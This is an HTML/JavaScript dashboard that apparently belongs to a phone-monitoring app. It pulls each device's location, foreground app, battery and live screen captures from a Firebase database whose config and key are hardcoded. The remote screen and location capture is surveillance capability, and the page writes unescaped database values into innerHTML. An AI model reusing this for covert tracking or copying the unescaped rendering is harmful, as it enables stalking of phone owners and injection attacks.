<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Phone Monitor</title>
  <style>
    body { font-family: system-ui, sans-serif; background:#0d1117; color:#e6edf3; margin:0; padding:16px; }
    h1 { font-size:20px; }
    .card { background:#161b22; border:1px solid #30363d; border-radius:12px; padding:16px; margin:12px 0; }
    .online { color:#3fb950; font-weight:700; }
    .offline { color:#f85149; font-weight:700; }
    .id { font-size:11px; color:#8b949e; word-break:break-all; margin:4px 0 12px; }
    .dot { height:10px; width:10px; border-radius:50%; display:inline-block; margin-right:6px; }
    .row { display:flex; justify-content:space-between; padding:6px 0; border-top:1px solid #21262d; }
    .row span:first-child { color:#8b949e; }
    a { color:#58a6ff; }
  </style>
</head>
<body>
  <h1>📱 Phone Monitor — Devices</h1>
  <div id="list">Loading...</div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyD-AVieCO3svf-FJVYF7jM-vB7LoAhA96Y",
      authDomain: "phonemonitor-d5cd2.firebaseapp.com",
      databaseURL: "https://phonemonitor-d5cd2-default-rtdb.firebaseio.com",
      projectId: "phonemonitor-d5cd2",
      storageBucket: "phonemonitor-d5cd2.firebasestorage.app",
      messagingSenderId: "182639081088",
      appId: "1:182639081088:android:90ec33a07bed0c22e79865"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    const timeAgo = (t) => {
      if (!t) return "-";
      const s = Math.floor((Date.now() - t) / 1000);
      if (s < 60) return s + "s ago";
      if (s < 3600) return Math.floor(s/60) + "m ago";
      return new Date(t).toLocaleString();
    };

    onValue(ref(db, "devices"), (snap) => {
      const data = snap.val() || {};
      const list = document.getElementById("list");
      const ids = Object.keys(data);
      if (ids.length === 0) { list.textContent = "No devices found."; return; }

      list.innerHTML = ids.map(id => {
        const d = data[id];
        const live = d.live || {};
        const screen = d.screen || {};
        const img = screen.frame
          ? `<img src="data:image/jpeg;base64,${screen.frame}" style="width:100%;border-radius:8px;margin-top:12px;border:1px solid #30363d" />`
          : "";
        const online = d.status === "online";
        const map = (live.lat && live.lng)
          ? `<a href="https://www.google.com/maps?q=${live.lat},${live.lng}" target="_blank">View on map</a>`
          : "-";
        return `<div class="card">
          <div><span class="dot ${online?'online':'offline'}" style="background:${online?'#3fb950':'#f85149'}"></span>
          <span class="${online?'online':'offline'}">${online?'ONLINE':'OFFLINE'}</span></div>
          <div class="id">${id}</div>
          <div class="row"><span>🔋 Battery</span><span>${live.battery ?? '-'}%</span></div>
          <div class="row"><span>📶 Network</span><span>${live.network ?? '-'}</span></div>
          <div class="row"><span>📱 Current app</span><span>${live.currentApp ?? '-'}</span></div>
          <div class="row"><span>📍 Location</span><span>${map}</span></div>
          <div class="row"><span>🕒 Last seen</span><span>${timeAgo(d.lastSeen)}</span></div>
          ${img}
        </div>`;
      }).join("");
    });
  </script>
</body>
</html>
